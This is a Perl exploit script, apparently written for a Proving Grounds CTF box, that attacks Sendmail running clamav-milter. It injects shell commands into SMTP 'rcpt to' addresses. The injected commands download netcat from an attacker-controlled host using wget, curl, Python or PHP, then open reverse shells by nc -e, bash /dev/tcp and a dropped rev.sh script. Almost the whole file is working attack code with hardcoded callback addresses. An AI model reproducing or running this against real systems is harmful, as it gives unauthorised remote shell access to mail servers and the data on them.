### black-hole.pl - Netcat Download & Reverse Shell
### For Proving Grounds CTF
########################################################
use IO::Socket;
use IO::Socket::INET;

print "Sendmail w/ clamav-milter - Netcat Download & Reverse Shell\n";
print "LHOST: 192.168.45.229, LPORT: 443\n";

if ($#ARGV != 0) {
    print "Usage: perl $0 <target_ip>\n";
    print "Example: perl $0 10.10.10.100\n";
    exit;
}

my $target = $ARGV[0];
my $lhost = "192.168.45.229";
my $lport = "443";
my $web_port = "8080";  # Port for hosting netcat

print "Attacking $target...\n";
print "Will download netcat from http://$lhost:$web_port/\n";
print "Reverse shell to $lhost:$lport\n";

# First, start a simple HTTP server on your machine to serve netcat
print "\n=== IMPORTANT ===\n";
print "1. On YOUR machine (192.168.45.229), run these commands:\n";
print "   cp /bin/nc ./netcat  # or get nc from /usr/bin/nc\n";
print "   python3 -m http.server $web_port\n";
print "   OR if python3 not available:\n";
print "   php -S $lhost:$web_port\n";
print "   OR: busybox httpd -p $web_port -h .\n";
print "2. In another terminal, start your listener:\n";
print "   nc -lnvp $lport\n";
print "========================\n\n";

print "Press Enter when ready...";
<STDIN>;

$sock = IO::Socket::INET->new(PeerAddr => $target,
                              PeerPort => '25',
                              Proto    => 'tcp',
                              Timeout  => 10);

if (!$sock) {
    print "Failed to connect to $target:25\n";
    exit;
}

print "[+] Connected to SMTP server\n";

# Test command execution first
print "[*] Testing command execution...\n";
print $sock "ehlo attacker\r\n";
print $sock "mail from: <>\r\n";
print $sock "rcpt to: <nobody+\"|id > /tmp/test.txt 2>&1\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|echo 'Test from exploit' >> /tmp/test.txt 2>&1\"@localhost>\r\n";

# Check available download tools
print "[*] Checking download tools...\n";
print $sock "rcpt to: <nobody+\"|which wget curl python3 python php busybox > /tmp/tools.txt 2>&1\"@localhost>\r\n";

# Method 1: Using wget
print "[*] Attempting to download netcat via wget...\n";
print $sock "rcpt to: <nobody+\"|wget http://$lhost:$web_port/netcat -O /tmp/nc 2>&1\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|chmod +x /tmp/nc 2>&1\"@localhost>\r\n";

# Method 2: Using curl
print "[*] Attempting to download netcat via curl...\n";
print $sock "rcpt to: <nobody+\"|curl http://$lhost:$web_port/netcat -o /tmp/nc 2>&1\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|chmod +x /tmp/nc 2>&1\"@localhost>\r\n";

# Method 3: Using Python
print "[*] Attempting to download via Python...\n";
print $sock "rcpt to: <nobody+\"|python3 -c 'import urllib.request; urllib.request.urlretrieve(\\\"http://$lhost:$web_port/netcat\\\", \\\"/tmp/nc\\\")' 2>&1\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|python -c 'import urllib; urllib.urlretrieve(\\\"http://$lhost:$web_port/netcat\\\", \\\"/tmp/nc\\\")' 2>&1\"@localhost>\r\n";

# Method 4: Using PHP
print "[*] Attempting to download via PHP...\n";
print $sock "rcpt to: <nobody+\"|php -r 'file_put_contents(\\\"/tmp/nc\\\", file_get_contents(\\\"http://$lhost:$web_port/netcat\\\"));' 2>&1\"@localhost>\r\n";

# Once downloaded, execute reverse shell
print "[*] Attempting to execute reverse shell...\n";

# Try different netcat syntax variations
print $sock "rcpt to: <nobody+\"|/tmp/nc -e /bin/sh $lhost $lport 2>&1 &\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|/tmp/nc $lhost $lport -e /bin/bash 2>&1 &\"@localhost>\r\n";

# Traditional netcat (BSD style)
print $sock "rcpt to: <nobody+\"|/tmp/nc $lhost $lport </dev/null | /bin/sh 2>&1 | tee /tmp/debug.txt\"@localhost>\r\n";

# Try if /dev/tcp works with downloaded bash
print $sock "rcpt to: <nobody+\"|/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1 2>&1 &\"@localhost>\r\n";

# Alternative: create a script
print $sock "rcpt to: <nobody+\"|echo '#!/bin/sh' > /tmp/rev.sh\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|echo '/tmp/nc $lhost $lport -e /bin/sh' >> /tmp/rev.sh\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|chmod +x /tmp/rev.sh\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|/tmp/rev.sh &\"@localhost>\r\n";

# Complete the SMTP transaction
print "[*] Finalizing SMTP transaction...\n";
print $sock "data\r\n.\r\nquit\r\n";

# Read and print responses
print "\n[+] SMTP Responses:\n";
while (my $response = <$sock>) {
    print ">> $response";
    last if $response =~ /^221/;  # Quit response
}

print "\n[+] Exploit sequence completed.\n";
print "[+] Check your listener for shell and HTTP server for download requests.\n";
print "[+] If no shell, check which commands succeeded by examining responses above.\n";
